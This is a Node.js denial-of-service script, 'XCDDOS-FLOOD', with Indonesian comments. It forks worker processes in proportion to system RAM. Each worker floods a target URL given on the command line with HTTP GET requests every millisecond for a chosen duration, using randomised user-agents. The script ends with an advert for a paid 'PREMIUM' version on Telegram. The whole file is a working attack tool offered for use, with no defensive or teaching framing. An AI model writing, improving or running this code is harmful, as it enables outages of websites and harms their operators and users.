const { exec } = require('child_process');
const os = require('os');
const cluster = require('cluster');
const randomUseragent = require('random-useragent');

// Instalasi modul yang diperlukan
exec('npm install axios random-useragent os cluster utils', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`stderr: ${stderr}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  // Memulai skrip setelah instalasi selesai
  startScript();
});

function startScript() {
  if (cluster.isMaster) {
    const totalMemoryGB = os.totalmem() / (1024 * 1024 * 1024);
    const threadCount = Math.ceil(totalMemoryGB * 0.5); // Contoh: gunakan 50% RAM untuk thread
    console.log(`Master ${process.pid} is running`);

    // Fork worker processes
    for (let i = 0; i < threadCount; i++) {
      cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const axios = require('axios');
    const { getCurrentTime, getTitleFromHTML } = require('utils');

    // Fungsi getStatus dan bagian lain dari kode skrip Anda dimulai di sini
    function getStatus(targetURL) {
      const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
          reject(new Error('Request timed out'));
        }, 5000);
      });

      const userAgent = randomUseragent.getRandom();
      const axiosPromise = axios.get(targetURL, { headers: { 'User-Agent': userAgent } });

      Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
          const { status, data } = response;
          console.log(`[\x1b[35XCDDOS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
        })
        .catch((error) => {
          if (error.message === 'Request timed out') {
            console.log(`[\x1b[35XCDDOS\x1b[0m] ${getCurrentTime()} Request Timed Out`);
          } else if (error.response) {
            const extractedTitle = getTitleFromHTML(error.response.data);
            console.log(`[\x1b[35XCDDOS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
          } else {
            console.log(`[\x1b[35XCDDOS\x1b[0m] ${getCurrentTime()} ${error.message}`);
          }
        });
    }

    const target = process.argv[2];
    const duration = process.argv[3];

    if (process.argv.length < 4 || isNaN(parseInt(duration))) {
      console.log('Invalid Usage: node XCDDOS-FLOOD.js URL DURATION.');
      process.exit(1)
    } else {
      let permen = 0;
      const attackInterval = setInterval(() => {
        console.log(`Worker ${process.pid} attacking => ${target} Total Requests: ${permen}`);
        getStatus(target);
        permen++;

      }, 1);

      setTimeout(() => {
        clearInterval(attackInterval);
        console.log(`Worker ${process.pid} stopped attacking.`);
        console.log(`Jika Method Ini Di Rasa Kurang Over Power Anda Bisa Membelinya Versi PREMIUM Di Telegram: @Xin_Kenji`);
        process.exit(0);
      }, duration * 1000);
    }
  }
}